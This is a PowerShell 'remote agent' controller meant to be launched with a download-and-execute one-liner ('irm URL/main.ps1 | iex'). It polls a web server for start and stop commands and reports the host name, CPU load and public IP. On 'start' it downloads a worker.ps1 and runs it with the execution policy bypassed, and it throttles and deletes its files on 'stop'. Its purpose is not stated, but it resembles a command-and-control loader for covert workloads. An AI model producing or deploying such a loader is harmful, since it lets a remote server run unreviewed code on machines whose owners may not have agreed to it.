# ===================================
# MAIN CONTROLLER (REMOTE AGENT)
# Executed from URL using:
# irm URL/main.ps1 | iex
# ===================================

$SERVER = "https://your-project.vercel.app"
$SYSTEM = $env:COMPUTERNAME

$TEMP_DIR = "$env:TEMP\worker_env"
$global:WORKER_PROCESS = $null

$CPU_LIMIT = 70
$CHECK_INTERVAL = 30

Write-Host "Agent started for $SYSTEM"

# -----------------------------------
# VPN / INTERNET CHECK
# -----------------------------------
function Check-VPN {

    try {
        $ip = Invoke-RestMethod "https://api.ipify.org"
        Write-Host "Public IP: $ip"
        return $true
    }
    catch {
        return $false
    }
}

# -----------------------------------
# CPU USAGE CHECK
# -----------------------------------
function Get-CPUUsage {

    (Get-Counter '\Processor(_Total)\% Processor Time'
    ).CounterSamples.CookedValue
}

# -----------------------------------
# SEND STATUS TO WEBSITE
# -----------------------------------
function Send-Status($running, $cpu, $vpn) {

    try {

        $body = @{
            system  = $SYSTEM
            running = $running
            cpu     = [int]$cpu
            vpn     = $vpn
        } | ConvertTo-Json

        Invoke-RestMethod `
            -Uri "$SERVER/api/status" `
            -Method Post `
            -Body $body `
            -ContentType "application/json" `
            -TimeoutSec 10 | Out-Null
    }
    catch {}
}

# -----------------------------------
# GET COMMAND FROM WEBSITE
# -----------------------------------
function Get-Command {

    try {
        $res = Invoke-RestMethod `
            -Uri "$SERVER/api/command?system=$SYSTEM" `
            -Method Get `
            -TimeoutSec 10

        return $res.command
    }
    catch {
        return "idle"
    }
}

# -----------------------------------
# START WORKER
# -----------------------------------
function Start-Worker {

    if ($global:WORKER_PROCESS) { return }

    $vpnOk = Check-VPN
    if (!$vpnOk) {
        Write-Host "VPN/Internet not ready"
        return
    }

    Write-Host "Starting worker..."

    if (!(Test-Path $TEMP_DIR)) {
        New-Item -ItemType Directory $TEMP_DIR | Out-Null
    }

    $workerScript = "$TEMP_DIR\worker.ps1"

    Invoke-WebRequest `
        -Uri "$SERVER/worker.ps1" `
        -OutFile $workerScript

    $global:WORKER_PROCESS = Start-Process powershell `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$workerScript`"" `
        -PassThru
}

# -----------------------------------
# STOP WORKER + CLEANUP
# -----------------------------------
function Stop-Worker {

    Write-Host "Stopping worker..."

    if ($global:WORKER_PROCESS) {
        try {
            Stop-Process -Id $global:WORKER_PROCESS.Id -Force
        } catch {}
        $global:WORKER_PROCESS = $null
    }

    if (Test-Path $TEMP_DIR) {
        Remove-Item $TEMP_DIR -Recurse -Force
    }

    Write-Host "Environment cleaned."
}

# -----------------------------------
# MAIN LOOP
# -----------------------------------
while ($true) {

    $cpu = Get-CPUUsage
    $vpnOk = Check-VPN
    $command = Get-Command

    # CPU safety
    if ($cpu -gt $CPU_LIMIT -and $global:WORKER_PROCESS) {
        Write-Host "CPU limit exceeded"
        Stop-Worker
    }

    if ($command -eq "start") {
        Start-Worker
    }

    if ($command -eq "stop") {
        Stop-Worker
    }

    $running = $global:WORKER_PROCESS -ne $null
    Send-Status $running $cpu $vpnOk

    Start-Sleep -Seconds $CHECK_INTERVAL
}
